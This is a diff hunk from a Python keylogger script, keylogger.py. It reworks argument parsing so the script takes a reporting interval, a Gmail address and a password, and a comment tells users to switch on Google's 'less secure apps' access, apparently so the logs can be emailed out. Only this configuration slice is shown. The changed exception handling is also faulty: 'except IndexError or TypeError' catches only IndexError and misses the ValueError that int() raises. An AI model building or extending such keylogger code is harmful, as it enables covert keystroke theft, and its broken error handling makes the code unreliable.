@@ -15,19 +15,20 @@ except ModuleNotFoundError:
 # Timer to run a method after a particular interval of time
 from threading import Semaphore, Timer
 
-
 # before running the script set "ACCESS TO LESS SECURE APPS" to YES in google account
-# 60 seconds
-TIME_INTERVAL = 60
+
 try:
-    # sys.argv[1] will take email as first CLA
-    # or we can replace sys.argv[1] with "email"
-    EMAIL = sys.argv[1]
-    # sys.argv[2] will take password as first CLA
-    # or we can replace sys.argv[2] with "password"
-    PASSWORD = sys.argv[2]
-except:
-    print("Usage :\npython3 keylogger.py \"email\" \"password\"")
+    # sys.argv[1] will take time in seconds as first CLA
+    # or we can replace sys.argv[1] with 60 for (1 minute)
+    TIME_INTERVAL = int(sys.argv[1])
+    # sys.argv[2] will take email as second CLA
+    # or we can replace sys.argv[2] with "email"
+    EMAIL = sys.argv[2]
+    # sys.argv[3] will take password as third CLA
+    # or we can replace sys.argv[3] with "password"
+    PASSWORD = sys.argv[3]
+except IndexError or TypeError:
+    print("Usage :\npython3 keylogger.py \"time_interval_in_seconds\" \"email\" \"password\"")
     sys.exit(1)
 
 
